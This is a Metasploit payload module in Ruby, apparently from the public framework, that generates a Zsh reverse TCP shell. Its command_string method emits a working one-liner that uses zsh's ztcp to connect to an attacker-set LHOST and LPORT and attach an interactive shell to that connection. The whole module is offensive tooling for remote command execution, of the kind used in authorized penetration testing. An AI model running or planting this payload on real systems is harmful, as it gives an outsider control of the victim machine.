##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 94

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Unix Command Shell, Reverse TCP (via Zsh)',
      'Description' => %q{
        Connect back and create a command shell via Zsh.  Note: Although Zsh is often
        available, please be aware it isn't usually installed by default.
      },
      'Author'      =>
        [
          'Doug Prostko <dougtko[at]gmail.com>',    # Initial payload
          'Wang Yihang <wangyihanger[at]gmail.com>' # Simplified redirections
        ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'unix',
      'Arch'        => ARCH_CMD,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::CommandShell,
      'PayloadType' => 'cmd',
      'RequiredCmd' => 'zsh',
      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
  end

  def generate
    super + command_string
  end

  def command_string
    "zsh -c 'zmodload zsh/net/tcp && ztcp #{datastore['LHOST']} #{datastore['LPORT']} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
  end
end
